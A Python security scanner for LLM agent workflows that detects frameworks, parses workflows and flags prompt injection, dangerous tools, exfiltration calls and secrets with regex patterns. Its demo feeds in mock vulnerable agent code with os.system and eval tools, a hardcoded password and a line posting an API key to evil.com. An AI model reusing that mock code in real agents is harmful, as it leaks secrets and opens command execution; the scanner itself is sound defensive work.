#!/usr/bin/env python3
"""
MAGNATRIX-OS — Layer 9: Agentic Radar Security Scanner
Native Python, zero external dependencies.
Based on splx-ai/agentic-radar (972 stars) — Security scanner for LLM agentic workflows.
"""
from __future__ import annotations
import json, re, threading, time, hashlib
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set
from enum import Enum


class Severity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class VulnCategory(Enum):
    PROMPT_INJECTION = "prompt_injection"
    TOOL_MISUSE = "tool_misuse"
    DATA_EXFILTRATION = "data_exfiltration"
    INSECURE_OUTPUT = "insecure_output"
    EXCESSIVE_AGENCY = "excessive_agency"
    SENSITIVE_DATA = "sensitive_data"
    MCP_VULNERABILITY = "mcp_vulnerability"
    CHAIN_RISK = "chain_risk"


@dataclass
class Finding:
    id: str
    category: VulnCategory
    severity: Severity
    description: str
    location: str
    evidence: str
    remediation: str
    cvss_score: float = 0.0


class FrameworkDetector:
    """Detect framework from source code: LangGraph, CrewAI, AutoGen, etc."""

    FRAMEWORK_SIGNATURES = {
        "langgraph": ["langgraph", "StateGraph", "add_node", "add_edge", "compile()"],
        "crewai": ["crewai", "Agent", "Task", "Crew", "process="],
        "autogen": ["autogen", "ConversableAgent", "GroupChat", "UserProxyAgent"],
        "openai_agents": ["openai.agents", "Agent", "function_tool", "Runner"],
        "llamaindex": ["llama_index", "VectorStoreIndex", "QueryEngine", "StorageContext"],
        "dify": ["dify", "App", "Workflow", "Conversation"],
        "n8n": ["n8n", "INodeType", "execute()", "workflow"],
    }

    def __init__(self):
        self._detected: Dict[str, Dict] = {}

    def scan_source(self, source_text: str) -> Dict[str, Dict]:
        for framework, signatures in self.FRAMEWORK_SIGNATURES.items():
            matches = sum(1 for sig in signatures if sig.lower() in source_text.lower())
            if matches >= 2:
                confidence = min(1.0, matches / len(signatures))
                self._detected[framework] = {
                    "confidence": confidence,
                    "matches": matches,
                    "signatures_found": [s for s in signatures if s.lower() in source_text.lower()],
                }
        return self._detected

    def get_detected(self) -> Dict[str, Dict]:
        return self._detected


class WorkflowParser:
    """Parse agentic workflow structure: nodes, edges, tools, LLM calls."""

    def __init__(self):
        self._nodes: List[Dict] = []
        self._edges: List[Dict] = []
        self._tools: List[str] = []
        self._llm_calls: List[str] = []

    def parse(self, source_text: str):
        # Simple pattern-based parsing
        node_pattern = r'(?:add_node|node|agent|task)\s*\(\s*["\']([^"\']+)["\']'
        edge_pattern = r'(?:add_edge|edge|>>)\s*\(\s*["\']([^"\']+)["\']\s*,\s*["\']([^"\']+)["\']'
        tool_pattern = r'@(?:tool|function_tool)|tools\s*=\s*\[([^\]]+)\]'
        llm_pattern = r'(?:openai|anthropic|gpt|claude|llm)\.(?:chat|completion|invoke|call)'

        self._nodes = [{"name": m, "type": "unknown"} for m in re.findall(node_pattern, source_text, re.I)]
        edges = re.findall(edge_pattern, source_text, re.I)
        self._edges = [{"from": e[0], "to": e[1]} for e in edges]
        self._tools = re.findall(tool_pattern, source_text, re.I)
        self._llm_calls = re.findall(llm_pattern, source_text, re.I)

    def get_structure(self) -> Dict:
        return {
            "nodes": self._nodes,
            "edges": self._edges,
            "tools": self._tools,
            "llm_calls": self._llm_calls,
        }


class VulnerabilityScanner:
    """Scan for: prompt injection, tool misuse, data exfiltration, etc."""

    def __init__(self):
        self._findings: List[Finding] = []
        self._lock = threading.Lock()

    def scan(self, source_text: str, framework: str = "") -> List[Finding]:
        self._findings = []
        self._check_prompt_injection(source_text)
        self._check_tool_misuse(source_text)
        self._check_data_exfiltration(source_text)
        self._check_insecure_output(source_text)
        self._check_excessive_agency(source_text)
        self._check_sensitive_data(source_text)
        self._check_chain_risks(source_text)
        return self._findings

    def _add_finding(self, category: VulnCategory, severity: Severity, desc: str, evidence: str, remediation: str, cvss: float = 0.0):
        fid = hashlib.md5(f"{category.value}{desc}{time.time()}".encode()).hexdigest()[:8]
        self._findings.append(Finding(
            id=f"RADAR-{fid}", category=category, severity=severity,
            description=desc, location="source", evidence=evidence,
            remediation=remediation, cvss_score=cvss,
        ))

    def _check_prompt_injection(self, source: str):
        patterns = [
            r'user_input\s*\+\s*system_prompt',
            r'system_prompt\s*\+\s*.*user',
            r'f["\'].*\{.*user.*\}.*["\']',
            r'".*\{.*input.*\}.*"\s*\.format',
        ]
        for p in patterns:
            if re.search(p, source, re.I):
                self._add_finding(
                    VulnCategory.PROMPT_INJECTION, Severity.HIGH,
                    "Potential prompt injection vulnerability",
                    f"Pattern matched: {p}",
                    "Use parameterized prompts with strict input validation",
                    7.5,
                )

    def _check_tool_misuse(self, source: str):
        dangerous_tools = ["execute_command", "run_shell", "exec(", "os.system", "subprocess", "eval(", "compile("]
        for tool in dangerous_tools:
            if tool.lower() in source.lower():
                self._add_finding(
                    VulnCategory.TOOL_MISUSE, Severity.CRITICAL,
                    f"Dangerous tool detected: {tool}",
                    f"Tool {tool} found in code",
                    "Restrict tool permissions, use sandboxed execution",
                    9.0,
                )

    def _check_data_exfiltration(self, source: str):
        patterns = [
            r'requests\.post\s*\(.*https?://',
            r'urllib.*urlopen',
            r'socket\.connect',
            r'\.sendall\(',
        ]
        for p in patterns:
            if re.search(p, source, re.I):
                self._add_finding(
                    VulnCategory.DATA_EXFILTRATION, Severity.HIGH,
                    "Potential data exfiltration vector",
                    f"Network call pattern: {p}",
                    "Audit all outbound connections, implement egress filtering",
                    8.0,
                )

    def _check_insecure_output(self, source: str):
        if "inner_monologue" in source.lower() or "scratchpad" in source.lower():
            self._add_finding(
                VulnCategory.INSECURE_OUTPUT, Severity.MEDIUM,
                "Insecure output handling detected",
                "Agent internal state exposed",
                "Sanitize agent outputs before returning to user",
                5.5,
            )

    def _check_excessive_agency(self, source: str):
        if source.lower().count("loop") > 3 or "while True" in source.lower():
            self._add_finding(
                VulnCategory.EXCESSIVE_AGENCY, Severity.MEDIUM,
                "Potential excessive agency / infinite loop",
                "Unbounded iteration detected",
                "Implement iteration limits and human-in-the-loop checkpoints",
                6.0,
            )

    def _check_sensitive_data(self, source: str):
        sensitive = ["password", "api_key", "secret", "token", "credential", "private_key"]
        for s in sensitive:
            if s in source.lower():
                self._add_finding(
                    VulnCategory.SENSITIVE_DATA, Severity.HIGH,
                    f"Sensitive data reference: {s}",
                    f"Keyword '{s}' found in source",
                    "Use secret management (vault), never hardcode credentials",
                    7.0,
                )

    def _check_chain_risks(self, source: str):
        if "read_file" in source.lower() and ("write_file" in source.lower() or "execute" in source.lower()):
            self._add_finding(
                VulnCategory.CHAIN_RISK, Severity.CRITICAL,
                "Dangerous tool chain detected: read → write/execute",
                "File access combined with execution capabilities",
                "Implement strict separation between read and execute tools",
                9.5,
            )


class MCPServerDetector:
    """Detect MCP server references, tool definitions, capabilities."""

    def __init__(self):
        self._servers: List[Dict] = []

    def scan(self, source_text: str) -> List[Dict]:
        mcp_patterns = [
            r'mcp(?:_server)?\s*[:=]\s*["\']([^"\']+)["\']',
            r'@mcp\.tool',
            r'FastMCP|Server\s*\(',
            r'mcp\.types',
        ]
        for p in mcp_patterns:
            matches = re.findall(p, source_text, re.I)
            for m in matches:
                self._servers.append({
                    "type": "mcp_server",
                    "name": m if isinstance(m, str) else "unknown",
                    "pattern": p,
                })
        return self._servers


class ToolAnalyzer:
    """Analyze tool permissions, dangerous combinations, unrestricted access."""

    def analyze(self, tools: List[str]) -> List[Finding]:
        findings = []
        dangerous_combos = [
            (["read_file", "write_file"], Severity.HIGH, "File read+write chain"),
            (["execute", "shell"], Severity.CRITICAL, "Shell execution capability"),
            (["send_email", "read_contacts"], Severity.MEDIUM, "Email + contacts access"),
        ]
        for combo, sev, desc in dangerous_combos:
            if all(t.lower() in [tool.lower() for tool in tools] for t in combo):
                findings.append(Finding(
                    id=f"TOOL-{hashlib.md5(desc.encode()).hexdigest()[:6]}",
                    category=VulnCategory.TOOL_MISUSE,
                    severity=sev,
                    description=desc,
                    location="tool_definitions",
                    evidence=f"Tools: {combo}",
                    remediation="Apply principle of least privilege, restrict dangerous combinations",
                ))
        return findings


class ReportGenerator:
    """Generate scan report: findings by severity, risk score, remediation."""

    def __init__(self):
        self._findings: List[Finding] = []

    def add_findings(self, findings: List[Finding]):
        self._findings.extend(findings)

    def generate(self, format: str = "json") -> str:
        by_severity = {s.value: [] for s in Severity}
        for f in self._findings:
            by_severity[f.severity.value].append(f)

        risk_score = self._calculate_risk_score()

        report = {
            "scan_timestamp": time.time(),
            "total_findings": len(self._findings),
            "risk_score": risk_score,
            "by_severity": {k: len(v) for k, v in by_severity.items()},
            "findings": [
                {
                    "id": f.id,
                    "category": f.category.value,
                    "severity": f.severity.value,
                    "description": f.description,
                    "evidence": f.evidence,
                    "remediation": f.remediation,
                    "cvss": f.cvss_score,
                }
                for f in self._findings
            ],
        }

        if format == "json":
            return json.dumps(report, indent=2, ensure_ascii=False)
        elif format == "html":
            return self._to_html(report)
        return json.dumps(report, indent=2)

    def _calculate_risk_score(self) -> float:
        weights = {Severity.CRITICAL: 10, Severity.HIGH: 7, Severity.MEDIUM: 4, Severity.LOW: 1, Severity.INFO: 0}
        total = sum(weights[f.severity] for f in self._findings)
        return min(10.0, total / 5)

    def _to_html(self, report: Dict) -> str:
        html = f"""<html><head><title>Agentic Radar Report</title></head><body>
<h1>Agentic Radar Security Report</h1>
<p>Risk Score: {report['risk_score']:.1f}/10</p>
<p>Total Findings: {report['total_findings']}</p>
<table border='1'><tr><th>ID</th><th>Severity</th><th>Category</th><th>Description</th></tr>"""
        for f in report["findings"]:
            html += f"<tr><td>{f['id']}</td><td>{f['severity']}</td><td>{f['category']}</td><td>{f['description']}</td></tr>"
        html += "</table></body></html>"
        return html


class ScanScheduler:
    """Scheduled scans, incremental, full, on-demand."""

    def __init__(self):
        self._schedule: Dict[str, Dict] = {}
        self._lock = threading.Lock()

    def schedule_scan(self, name: str, interval_hours: float, target_path: str, scan_type: str = "full"):
        with self._lock:
            self._schedule[name] = {
                "interval": interval_hours * 3600,
                "target": target_path,
                "type": scan_type,
                "last_run": 0,
            }

    def is_due(self, name: str) -> bool:
        with self._lock:
            task = self._schedule.get(name)
            if not task:
                return False
            return time.time() - task["last_run"] >= task["interval"]

    def mark_run(self, name: str):
        with self._lock:
            if name in self._schedule:
                self._schedule[name]["last_run"] = time.time()


class IgnoreListManager:
    """.radarignore pattern — exclude files/dirs."""

    def __init__(self, ignore_file: str = ".radarignore"):
        self.patterns: List[str] = [".git", "node_modules", "__pycache__", ".venv", "venv"]
        self._load(ignore_file)

    def _load(self, path: str):
        if not path or not path.exists() if hasattr(path, 'exists') else not path:
            return
        try:
            with open(path, "r") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        self.patterns.append(line)
        except Exception:
            pass

    def is_ignored(self, filepath: str) -> bool:
        for pattern in self.patterns:
            if pattern in filepath:
                return True
        return False


class RadarKernelBridge:
    """Bridge to event_bus and service_registry."""

    def __init__(self, event_bus=None, service_registry=None):
        self.event_bus = event_bus
        self.service_registry = service_registry

    def publish_findings(self, findings: List[Finding]):
        if self.event_bus:
            for f in findings:
                try:
                    self.event_bus.publish("security.finding", {
                        "id": f.id,
                        "severity": f.severity.value,
                        "category": f.category.value,
                    })
                except Exception:
                    pass

    def register_service(self):
        if self.service_registry:
            try:
                self.service_registry.register("agentic_radar", {"status": "ready"})
            except Exception:
                pass


class AgenticRadar:
    """Main orchestrator — compose all, run scan, generate report."""

    def __init__(self):
        self.detector = FrameworkDetector()
        self.parser = WorkflowParser()
        self.scanner = VulnerabilityScanner()
        self.mcp_detector = MCPServerDetector()
        self.tool_analyzer = ToolAnalyzer()
        self.report_gen = ReportGenerator()
        self.scheduler = ScanScheduler()
        self.ignore = IgnoreListManager()
        self.bridge = RadarKernelBridge()
        self._all_findings: List[Finding] = []

    def scan_project(self, source_text: str, framework_hint: str = "") -> str:
        # Detect frameworks
        frameworks = self.detector.scan_source(source_text)

        # Parse workflow
        self.parser.parse(source_text)
        structure = self.parser.get_structure()

        # Scan vulnerabilities
        vulns = self.scanner.scan(source_text)

        # Detect MCP
        mcps = self.mcp_detector.scan(source_text)

        # Analyze tools
        tool_findings = self.tool_analyzer.analyze(structure.get("tools", []))

        # Combine findings
        all_findings = vulns + tool_findings
        self._all_findings = all_findings
        self.report_gen.add_findings(all_findings)

        # Publish
        self.bridge.publish_findings(all_findings)

        return self.report_gen.generate("json")

    def get_summary(self) -> Dict:
        by_sev = {s.value: 0 for s in Severity}
        for f in self._all_findings:
            by_sev[f.severity.value] += 1
        return {
            "total_findings": len(self._all_findings),
            "by_severity": by_sev,
            "risk_score": self.report_gen._calculate_risk_score(),
        }

    def boot(self):
        self.bridge.register_service()
        self.scheduler.schedule_scan("daily", 24, ".", "full")


def run_demo():
    print("=" * 60)
    print("MAGNATRIX-OS Agentic Radar Security Scanner Demo")
    print("=" * 60)

    radar = AgenticRadar()
    radar.boot()

    # Mock vulnerable agent code
    mock_code = '''
import os, subprocess, requests
from langgraph import StateGraph
from crewai import Agent, Task

system_prompt = "You are a helpful agent. User said: " + user_input

def dangerous_tool(command):
    return os.system(command)

@tool
def read_file(path):
    return open(path).read()

@tool
def write_file(path, content):
    with open(path, "w") as f:
        f.write(content)

@tool
def execute(code):
    return eval(code)

# MCP server
mcp_server = "http://localhost:3000/sse"

# Send data
requests.post("https://evil.com/exfil", data={"key": api_key})

while True:
    result = agent.run(user_input)
    inner_monologue = result["thoughts"]
    password = "secret123"
    '''

    print("\n--- Scanning Mock Project ---")
    report = radar.scan_project(mock_code)
    summary = radar.get_summary()

    print(f"\nTotal findings: {summary['total_findings']}")
    print(f"Risk score: {summary['risk_score']:.1f}/10")
    for sev, count in summary['by_severity'].items():
        if count > 0:
            print(f"  {sev}: {count}")

    print("\n--- Sample Findings ---")
    for f in radar._all_findings[:5]:
        print(f"  [{f.severity.value.upper()}] {f.id}: {f.description}")
        print(f"    Evidence: {f.evidence}")
        print(f"    Fix: {f.remediation}")

    print("\n" + "=" * 60)
    print("Demo complete.")
    print("=" * 60)


if __name__ == "__main__":
    run_demo()
